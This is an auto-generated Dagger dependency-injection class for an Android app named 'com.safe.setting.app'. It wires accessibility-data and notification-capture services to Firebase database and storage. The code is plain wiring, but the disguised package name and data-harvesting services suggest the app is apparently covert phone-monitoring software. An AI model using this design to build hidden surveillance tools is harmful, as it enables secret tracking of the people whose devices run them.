package com.safe.setting.app.di.component;

import com.google.errorprone.annotations.CanIgnoreReturnValue;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.storage.StorageReference;
import com.safe.setting.app.app.Hom;
import com.safe.setting.app.data.rxFirebase.InterfaceFirebase;
import com.safe.setting.app.di.module.AppModule;
import com.safe.setting.app.di.module.AppModule_ProvideContextFactory;
import com.safe.setting.app.di.module.FirebaseModule;
import com.safe.setting.app.di.module.FirebaseModule_ProvideDatabaseReferenceFactory;
import com.safe.setting.app.di.module.FirebaseModule_ProvideFirebaseAuthFactory;
import com.safe.setting.app.di.module.FirebaseModule_ProvideFirebaseDatabaseFactory;
import com.safe.setting.app.di.module.FirebaseModule_ProvideFirebaseStorageFactory;
import com.safe.setting.app.di.module.FirebaseModule_ProvideInterfaceFirebaseFactory;
import com.safe.setting.app.di.module.FirebaseModule_ProvideStorageReferenceFactory;
import com.safe.setting.app.services.accessibilityData.AccessibilityDataService;
import com.safe.setting.app.services.accessibilityData.AccessibilityDataService_MembersInjector;
import com.safe.setting.app.services.accessibilityData.InteractorAccessibilityData;
import com.safe.setting.app.services.notificationService.InteractorNotificationService;
import com.safe.setting.app.services.notificationService.NotificationService;
import com.safe.setting.app.services.notificationService.NotificationService_MembersInjector;
import dagger.internal.DaggerGenerated;
import dagger.internal.Preconditions;
import javax.annotation.processing.Generated;

@DaggerGenerated
@Generated(
    value = "dagger.internal.codegen.ComponentProcessor",
    comments = "https://dagger.dev"
)
@SuppressWarnings({
    "unchecked",
    "rawtypes",
    "KotlinInternal",
    "KotlinInternalInJava",
    "cast"
})
public final class DaggerAppComponent {
  private DaggerAppComponent() {
  }

  public static Builder builder() {
    return new Builder();
  }

  public static final class Builder {
    private AppModule appModule;

    private FirebaseModule firebaseModule;

    private Builder() {
    }

    public Builder appModule(AppModule appModule) {
      this.appModule = Preconditions.checkNotNull(appModule);
      return this;
    }

    public Builder firebaseModule(FirebaseModule firebaseModule) {
      this.firebaseModule = Preconditions.checkNotNull(firebaseModule);
      return this;
    }

    public AppComponent build() {
      Preconditions.checkBuilderRequirement(appModule, AppModule.class);
      if (firebaseModule == null) {
        this.firebaseModule = new FirebaseModule();
      }
      return new AppComponentImpl(appModule, firebaseModule);
    }
  }

  private static final class AppComponentImpl implements AppComponent {
    private final AppModule appModule;

    private final FirebaseModule firebaseModule;

    private final AppComponentImpl appComponentImpl = this;

    private AppComponentImpl(AppModule appModuleParam, FirebaseModule firebaseModuleParam) {
      this.appModule = appModuleParam;
      this.firebaseModule = firebaseModuleParam;

    }

    private InteractorAccessibilityData interactorAccessibilityData() {
      return new InteractorAccessibilityData(AppModule_ProvideContextFactory.provideContext(appModule), getInterfaceFirebase());
    }

    private InteractorNotificationService interactorNotificationService() {
      return new InteractorNotificationService(AppModule_ProvideContextFactory.provideContext(appModule), getInterfaceFirebase());
    }

    private DatabaseReference databaseReference() {
      return FirebaseModule_ProvideDatabaseReferenceFactory.provideDatabaseReference(firebaseModule, FirebaseModule_ProvideFirebaseDatabaseFactory.provideFirebaseDatabase(firebaseModule));
    }

    private StorageReference storageReference() {
      return FirebaseModule_ProvideStorageReferenceFactory.provideStorageReference(firebaseModule, FirebaseModule_ProvideFirebaseStorageFactory.provideFirebaseStorage(firebaseModule));
    }

    @Override
    public void inject(Hom app) {
    }

    @Override
    public void inject(AccessibilityDataService accessibilityDataService) {
      injectAccessibilityDataService(accessibilityDataService);
    }

    @Override
    public void inject(NotificationService notificationService) {
      injectNotificationService(notificationService);
    }

    @Override
    public InterfaceFirebase getInterfaceFirebase() {
      return FirebaseModule_ProvideInterfaceFirebaseFactory.provideInterfaceFirebase(firebaseModule, AppModule_ProvideContextFactory.provideContext(appModule), FirebaseModule_ProvideFirebaseAuthFactory.provideFirebaseAuth(firebaseModule), databaseReference(), storageReference());
    }

    @CanIgnoreReturnValue
    private AccessibilityDataService injectAccessibilityDataService(
        AccessibilityDataService instance) {
      AccessibilityDataService_MembersInjector.injectInteractor(instance, interactorAccessibilityData());
      return instance;
    }

    @CanIgnoreReturnValue
    private NotificationService injectNotificationService(NotificationService instance) {
      NotificationService_MembersInjector.injectInteractor(instance, interactorNotificationService());
      return instance;
    }
  }
}
